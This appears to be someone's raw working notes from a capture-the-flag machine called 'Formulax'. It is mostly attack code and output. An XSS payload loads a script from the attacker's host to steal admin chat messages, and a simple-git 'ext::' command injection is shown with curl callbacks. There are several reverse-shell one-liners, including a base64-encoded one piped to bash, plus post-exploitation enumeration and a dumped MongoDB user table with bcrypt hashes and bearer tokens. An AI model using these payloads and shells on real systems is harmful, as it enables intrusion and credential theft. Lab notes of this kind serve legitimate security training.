## linux machine Formulax

- [+] :	Target Ip 
   >>	10.10.11.6

## recon
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
|_http-cors: GET POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

xss on contact form , cant grab cookie 

read chat.js and contact.js to craft malicious js and execute it 

<img src=x onerror="var script1=document.createElement('script'); script1.src='http://10.10.16.83:8000/payload.js';document.head.appendChild(script1);"/>



10.10.11.6 - - [22/Jul/2024 03:15:38] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [22/Jul/2024 03:15:38] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
10.10.11.6 - - [22/Jul/2024 03:15:38] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [22/Jul/2024 03:15:38] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 - ## FOUND ADMIN HERE
10.10.11.6 - - [22/Jul/2024 03:15:38] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [22/Jul/2024 03:15:38] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 - ## FOUND SZBDOMAIN HERE -> (Write a script for  dev-git-auto-update.chatbot.htb to work properly)
10.10.11.6 - - [22/Jul/2024 03:15:38] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [22/Jul/2024 03:15:38] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
10.10.11.6 - - [22/Jul/2024 03:15:38] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [22/Jul/2024 03:15:38] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
10.10.11.6 - - [22/Jul/2024 03:15:40] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [22/Jul/2024 03:15:40] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -

- [+] :	 dev-git-auto-update.chatbot.htb 
   >>	Made with ❤ by Chatbot🤖 Using simple-git v3.14 
RCE 
>>https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221

poc eg :

		const simpleGit = require('simple-git')
		const git2 = simpleGit()
		git2.clone('ext::sh -c touch% /tmp/pwn% >&2', '/tmp/example-new-repo', ["-c", "protocol.ext.allow=always"]);

burp : 

"destinationUrl":"ext::sh -c curl% http://10.10.16.83:8000/rce"
l7wa 

webserver
10.10.11.6 - - [22/Jul/2024 03:44:13] code 404, message File not found
10.10.11.6 - - [22/Jul/2024 03:44:13] "GET /rce HTTP/1.1" 404 -


ext::sh -c curl% http://10.10.16.83:8000/$(ls or id or whatever but can execute /bin/bash here ) ( showe index.js with ls and www-data with id )

"ext::sh -c curl% http://10.10.16.83:8000/rev.sh"

ext::sh -c curl% http://10.10.16.83:8000/$(ls${IFS}-la)
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.6 - - [22/Jul/2024 22:54:52] code 404, message File not found
10.10.11.6 - - [22/Jul/2024 22:54:52] "GET /total HTTP/1.1" 404 -





ext::sh -c bash% ./rev.sh
ext::sh -c bash% chmod +x && ./rev.sh
ext::sh -c bash% -i >& /dev/tcp/10.10.16.83/9098 0>&1

bash -i >& /dev/tcp/10.10.16.83/4444 0>&1



ext::sh -c wget% http://localhost/$(echo${IFS}"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My82MzMzNiAwPiYxJwo="${IFS}|${IFS}base64${IFS}-d|bash)
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My82MzMzNiAwPiYxJwo=

echo${IFS}"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My82MzMzNiAwPiYxJwo="${IFS}|${IFS}base64${IFS}-d|bash



www-data@formulax:~$ ls
app
automation
git-auto-update



[+] Users with console
frank_dorky:x:1002:1002:,,,:/home/frank_dorky:/bin/bash
kai_relay:x:1001:1001:Kai Relay,,,:/home/kai_relay:/bin/bash
librenms:x:999:999::/opt/librenms:/usr/bin/bash
root:x:0:0:root:/root:/bin/bash

/var/www/.npm/
Binary processes permissions
/var/www/.cache/puppeteer/chrome/linux-113.0.5672.63/chrome-linux64/chrome

root        2652  0.0  0.1   8912  5496 pts/0    S+   20:40   0:00 sudo /usr/bin/office.sh

/usr/bin/mongod --config /etc/mongod.conf



+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)
/usr/lib/git-core:/usr/lib/git-core:/var/www/.nvm/versions/node/v20.2.0/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /usr/lib/git-core:/usr/lib/git-core:/var/www/.nvm/versions/node/v20.2.0/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin






MongoDB shell version v4.4.29
Build Info: {
    "version": "4.4.29",
    "gitVersion": "f4dda329a99811c707eb06d05ad023599f9be263",
    "openSSLVersion": "OpenSSL 1.1.1f  31 Mar 2020",
    "modules": [],
    "allocator": "tcmalloc",
    "environment": {
        "distmod": "ubuntu2004",
        "distarch": "x86_64",
        "target_arch": "x86_64"
    }
}
Found /etc/mongod.conf
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
net:
  port: 27017
  bindIp: 127.0.0.1
processManagement:
  timeZoneInfo: /usr/share/zoneinfo
  
  shell
  
  -
> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
> use testing 
switched to db testing
> show collections
messages
users
> db.messages.find()
> db.messages.find(*)
uncaught exception: SyntaxError: expected expression, got '*' :
@(shell):1:17
> db.messages.find()
> exit
bye
www-data@formulax:/data/db$ ls -la locate ^C
www-data@formulax:/data/db$ ls -la $(mongo) 
ls: unrecognized option '---'
Try 'ls --help' for more information.
www-data@formulax:/data/db$ locate mongo
bash: locate: command not found
www-data@formulax:/data/db$ which mongo
/usr/bin/mongo
www-data@formulax:/data/db$ ls -la /usr/bin/mongo
-rwxr-xr-x 1 root root 53891224 Dec 19  2013 /usr/bin/mongo
www-data@formulax:/data/db$ @(shell):1:17



{ "_id" : "featureCompatibilityVersion", "version" : "4.4" }



> show tables
system.sessions
> db.system.sessions.find()
{ "_id" : { "id" : UUID("7f7653bd-8042-40ea-99f5-4c48d0963231"), "uid" : BinData(0,"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=") }, "lastUse" : ISODate("2024-07-23T22:04:03.127Z") }
{ "_id" : { "id" : UUID("44b820db-72db-48a4-9c37-30054b1c1aef"), "uid" : BinData(0,"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=") }, "lastUse" : ISODate("2024-07-23T22:04:03.127Z") }
{ "_id" : { "id" : UUID("d90a0454-c53c-413e-91fd-d461d54dba7a"), "uid" : BinData(0,"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=") }, "lastUse" : ISODate("2024-07-23T22:04:03.127Z") }




```log
		

______________
```


{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjE3NzI0Nzh9.itgJPQZFpFLyZBSPflKxq4mZJsXpJe_oO8Rr60qBzRg", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
{ "_id" : ObjectId("66a0281b57cb541c7b42b3b2"), "name" : "test", "email" : "test@test.com", "password" : "$2b$10$Oz8WPh/pd7U8YRLmDIMa5.2ui1vyPqvwzvEXZP0dhC74MKRIX7AU6", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NmEwMjgxYjU3Y2I1NDFjN2I0MmIzYjIiLCJpYXQiOjE3MjE3NzIwNzB9.9o4rELKOv3xiGKbRnKg8uej1-P3VRBmAT1LIN8qoEFE", "__v" : 0 }



hashes:

admin:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC
frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6

test ->mine 
- [+] :	 
   >>	
- [+] :	 
   >>	
- [+] :	 
   >>	




